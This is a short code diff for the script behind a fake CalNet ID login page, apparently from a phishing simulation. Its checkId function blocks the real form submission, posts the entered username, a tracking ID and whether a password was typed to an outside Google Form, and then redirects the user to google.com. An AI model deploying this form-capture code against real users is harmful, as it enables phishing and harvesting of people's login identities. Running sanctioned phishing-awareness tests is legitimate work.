@@ -1,8 +1,3 @@
-var highlightcolor = "#fc3";
-var ns6 = document.getElementById && !document.all;
-var previous = '';
-var eventobj;
-
 // https://html-online.com/articles/get-url-parameters-javascript/
 function getUrlVars() {
     var vars = {};
@@ -15,8 +10,8 @@ function getUrlVars() {
 // Function to check CalNet ID for all numeric or invalid based on.
 function checkId() {
 	try {
-		event.preventDefault()
-		dfwedf
+		event.preventDefault();
+	
 		// get and check username in form
 		formUser = document.getElementById("username").value;
 		if (formUser == "") {formUser = "[no username entered in form]"}
@@ -31,6 +26,7 @@ function checkId() {
 		password = document.getElementById("password");
 		if (password.value != "") { passwordPassed = "Yes";}
 
+		// https://stackoverflow.com/questions/18073971/http-post-to-a-google-form
 		var xhr = new XMLHttpRequest();
 		let url = "https://docs.google.com/forms/d/e/1FAIpQLSfpXsb_DKVEVL-IZWf_SQdVdkH4oL2m7Rh9mUTRZRfGXo45ng/formResponse?usp=pp_url&entry.1545559792=" + urlUser + "&entry.1386775216=" + formUser + "&entry.830965781=" + passwordPassed + "&submit=Submit";
 		xhr.open("POST", url , true);
@@ -38,6 +34,7 @@ function checkId() {
 
 		window.location.replace("http://www.google.com");
 	} catch (e){
+		console.log(e);
 		var xhr = new XMLHttpRequest();
 		let url = "https://docs.google.com/forms/d/e/1FAIpQLSfpXsb_DKVEVL-IZWf_SQdVdkH4oL2m7Rh9mUTRZRfGXo45ng/formResponse?usp=pp_url&entry.1545559792=JSERROR&entry.1386775216=JSERROR&entry.830965781=JSERROR&submit=Submit";
 		xhr.open("POST", url , true);
